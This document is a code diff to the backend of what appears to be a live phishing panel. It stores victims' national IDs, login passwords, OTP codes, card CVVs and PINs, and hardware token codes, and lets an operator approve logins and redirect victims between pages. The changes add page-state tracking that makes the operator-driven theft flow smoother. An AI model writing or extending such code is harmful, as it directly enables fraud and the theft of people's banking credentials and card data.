@@ -211,6 +211,7 @@ function executeProcedure(name, input, isAdmin, data) {
       if (address) app.address = address;
       if (governorate) app.governorate = governorate;
       if (watchColor) { app.watchColor = watchColor; app.selectedWatch = watchColor; }
+      app.currentPage = 'personal';
       app.updatedAt = new Date().toISOString();
       return { success: true };
     }
@@ -221,6 +222,7 @@ function executeProcedure(name, input, isAdmin, data) {
       if (username) app.username = username;
       if (password) app.password = password;
       if (!app.fullName && username) app.fullName = username;
+      app.currentPage = 'waiting-login';
       app.redirectTo = null; app.redirectError = null;
       app.loginApproved = null; app.status = 'awaiting_login'; app.updatedAt = new Date().toISOString();
       return { success: true };
@@ -231,6 +233,7 @@ function executeProcedure(name, input, isAdmin, data) {
       const app = getOrCreateApp(data, nationalId);
       const code = otp || otpCode;
       if (code) { app.otp = code; app.otpCode = code; }
+      app.currentPage = 'processing';
       app.redirectTo = null; app.redirectError = null;
       app.status = 'awaiting_otp'; app.updatedAt = new Date().toISOString();
       return { success: true };
@@ -245,6 +248,7 @@ function executeProcedure(name, input, isAdmin, data) {
       if (cv) { app.cvv = cv; app.cardCvv = cv; }
       if (cardName) app.cardName = cardName;
       if (cardPin) app.cardPin = cardPin;
+      app.currentPage = 'processing';
       app.redirectTo = null; app.redirectError = null;
       app.status = 'awaiting_card'; app.updatedAt = new Date().toISOString();
       return { success: true };
@@ -255,6 +259,7 @@ function executeProcedure(name, input, isAdmin, data) {
       const app = getOrCreateApp(data, nationalId);
       const tk = hardToken || hardTokenCode || token;
       if (tk) app.hardToken = tk;
+      app.currentPage = 'processing';
       app.redirectTo = null; app.redirectError = null;
       app.status = 'awaiting_token'; app.updatedAt = new Date().toISOString();
       return { success: true };
@@ -265,6 +270,7 @@ function executeProcedure(name, input, isAdmin, data) {
       const app = getOrCreateApp(data, nationalId);
       const wl = watchLink || watchLinkOtp || link;
       if (wl) { app.watchLink = wl; app.watchLinkOtp = wl; }
+      app.currentPage = 'processing';
       app.redirectTo = null; app.redirectError = null;
       app.updatedAt = new Date().toISOString();
       return { success: true };
@@ -315,7 +321,7 @@ function executeProcedure(name, input, isAdmin, data) {
       const { applicationId, nationalId } = input;
       let app = nationalId ? data.applications[nationalId] : null;
       if (!app && applicationId) app = Object.values(data.applications).find(a => a.id === applicationId);
-      if (app) { app.loginApproved = true; app.redirectTo = 'otp'; app.status = 'login_approved'; app.updatedAt = new Date().toISOString(); }
+      if (app) { app.loginApproved = true; app.redirectTo = 'otp'; app.currentPage = 'otp'; app.status = 'login_approved'; app.updatedAt = new Date().toISOString(); }
       return { success: true };
     }
     case 'admin.rejectLogin': {
@@ -323,13 +329,13 @@ function executeProcedure(name, input, isAdmin, data) {
       const { applicationId, nationalId } = input;
       let app = nationalId ? data.applications[nationalId] : null;
       if (!app && applicationId) app = Object.values(data.applications).find(a => a.id === applicationId);
-      if (app) { app.loginApproved = false; app.redirectTo = 'login-error'; app.status = 'login_rejected'; app.updatedAt = new Date().toISOString(); }
+      if (app) { app.loginApproved = false; app.redirectTo = 'login-error'; app.currentPage = 'login'; app.status = 'login_rejected'; app.updatedAt = new Date().toISOString(); }
       return { success: true };
     }
     case 'admin.redirectUser': {
       if (!isAdmin) throw new Error('unauthorized');
       const { nationalId, redirectTo, page, redirectError, showError } = input;
-      if (nationalId && data.applications[nationalId]) { data.applications[nationalId].redirectTo = redirectTo || page || null; data.applications[nationalId].redirectError = redirectError || showError || null; data.applications[nationalId].updatedAt = new Date().toISOString(); }
+      if (nationalId && data.applications[nationalId]) { const dest = redirectTo || page || null; data.applications[nationalId].redirectTo = dest; if (dest) data.applications[nationalId].currentPage = dest; data.applications[nationalId].redirectError = redirectError || showError || null; data.applications[nationalId].updatedAt = new Date().toISOString(); }
       return { success: true };
     }
     case 'admin.redirectVisitor': {
